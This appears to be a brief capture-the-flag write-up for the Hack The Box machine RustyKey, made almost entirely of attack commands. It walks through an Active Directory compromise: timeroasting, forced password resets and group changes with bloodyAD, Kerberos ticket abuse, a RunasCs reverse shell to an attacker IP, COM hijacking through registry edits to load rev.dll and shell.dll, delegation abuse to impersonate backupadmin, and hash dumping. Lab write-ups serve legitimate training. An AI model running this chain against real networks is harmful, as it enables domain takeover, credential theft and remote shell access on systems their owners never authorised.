

![RustyKey](https://github.com/user-attachments/assets/3220ba58-c1c1-4014-939a-a5755dcfc88d)



#Nmap scans Results 


![scans](https://github.com/user-attachments/assets/5bfe0c03-afd4-4937-bf3e-0ed7b56eb5f5)


edit /etc/krb5.conf


![rusty](https://github.com/user-attachments/assets/b2295c57-e507-4614-8ec8-5e8aae80737f)


#use the creds you've got 
bloodhound-python -u $user -p $pass -c All -o bloodhound_$user.json -d rustykey.htb -ns 10.10.11.75 --zip -k

#start a timeroast attack using nxc

nxc smb IP  -M timeroast

![Screenshot_2025-06-30_13_47_47](https://github.com/user-attachments/assets/c89dc679-e224-4575-9c4c-eaf2c7547f28)

#now time for exploit chain 

bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k add groupMember HELPDESK 'IT-COMPUTER3$'
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password BB.MORGAN 'P@ssword123'
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' 'IT'

impacket-getTGT 'RUSTYKEY.HTB/BB.MORGAN:P@ssword123'
export KRB5CCNAME=BB.MORGAN.ccache
evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB

bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!'set password bb.morgan 'pa$$w0rd'

bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'Password123!'

.\RunasCs.exe ee.reed Password123! cmd.exe -r 10.10.14.31:9001
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Tools\rev.dll" /f
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Tools\rev.dll" /f
Powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
#exploitation chain 
![Screenshot_2025-06-30_17_54_46](https://github.com/user-attachments/assets/3b42da26-4cf9-4b79-aa00-231d84a05300)

impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.129.65.227 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Tools\shell.dll" /f

![Screenshot 2025-07-08 at 06-11-35 Hack The Box Hack The Box](https://github.com/user-attachments/assets/9a1ce703-d7f2-4c9b-8bec-6f867f3eaf0d)


NTLM hashes , system , sam dump , secretdump 
